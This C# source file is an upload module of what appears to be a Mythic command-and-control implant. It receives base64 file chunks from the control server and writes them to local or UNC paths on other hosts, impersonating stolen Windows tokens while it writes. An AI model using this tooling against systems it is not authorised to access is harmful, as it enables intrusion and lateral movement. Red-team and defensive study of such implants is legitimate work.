using Agent.Interfaces;

using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;

namespace upload
{
    public class Upload : IPlugin, IFilePlugin
    {
        public string Name => "upload";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        public Upload(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
        }

        public async Task Execute(ServerJob job)
        {
            //Check to see if the job exists. If not, then we can't do anything
            //if (!this.messageManager.TryGetJob(args["task-id"], out job))
            //{
            //    logger.Log("Unable to find Mythic Job. How did we get here then?");
            //    await messageManager.AddResponse(new DownloadResponse
            //    {
            //        status = "error",
            //        process_response = new Dictionary<string, string> { { "message", "0x16" } },
            //        completed = true,
            //        task_id = job.task.id
            //    }.ToJson());
            //}
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            ServerUploadJob uploadJob = new ServerUploadJob(job);
            Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
            uploadJob.path = uploadParams["remote_path"];
            if (uploadParams.ContainsKey("host") && !string.IsNullOrEmpty(uploadParams["host"]))
            {
                if (!uploadParams["remote_path"].Contains(":") && !uploadParams["remote_path"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
                {
                    uploadJob.path = @"\\" + uploadParams["host"] + @"\" + uploadParams["remote_path"];
                }
            }
            if (uploadParams.ContainsKey("chunk_size") && !string.IsNullOrEmpty(uploadParams["chunk_size"]))
            {
                try
                {
                    uploadJob.chunk_size = int.Parse(uploadParams["chunk_size"]);
                }
                catch { }
            }

            uploadJob.file_id = uploadParams["file"];
            uploadJob.task = job.task;
            uploadJob.chunk_num = 1;

            uploadJobs.GetOrAdd(job.task.id, uploadJob);
            logger.Log($"Starting upload job for file {uploadJob.file_id} ({uploadJob.chunk_num}/{uploadJob.total_chunks})");
            await messageManager.AddResponse(new UploadResponse
            {
                task_id = job.task.id,
                upload = new UploadResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            }.ToJson());
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
                this.CompleteUploadJob(response.task_id);
            }

            if (uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await messageManager.AddResponse(new ResponseResult
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x12" } },

                }.ToJson());
                return;
            }
            if (uploadJob.task.token != 0)
            {
                tokenManager.Impersonate(uploadJob.task.token);
            }
            await this.HandleNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
            if (uploadJob.task.token != 0)
            {
                tokenManager.Revert();
            }
            uploadJob.chunk_num++;

            UploadResponse ur = new UploadResponse()
            {
                task_id = response.task_id,
                upload = new UploadResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                Debug.WriteLine($"[{DateTime.Now}] Completing job.");
                this.CompleteUploadJob(response.task_id);
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
            }
            Debug.WriteLine($"[{DateTime.Now}] Requesting next chunk for file {uploadJob.file_id} ({uploadJob.chunk_num}/{uploadJob.total_chunks})");
            await messageManager.AddResponse(ur.ToJson());
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(ServerDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        public void CompleteUploadJob(string task_id)
        {
            if (uploadJobs.ContainsKey(task_id))
            {
                uploadJobs.Remove(task_id, out _);
            }
            this.messageManager.CompleteJob(task_id);
        }

        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<bool> HandleNextChunk(byte[] bytes, string job_id)
        {
            ServerUploadJob job = uploadJobs[job_id];
            try
            {
                await Misc.AppendAllBytes(job.path, bytes);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerUploadJob GetJob(string task_id)
        {
            return uploadJobs[task_id];
        }
    }
}
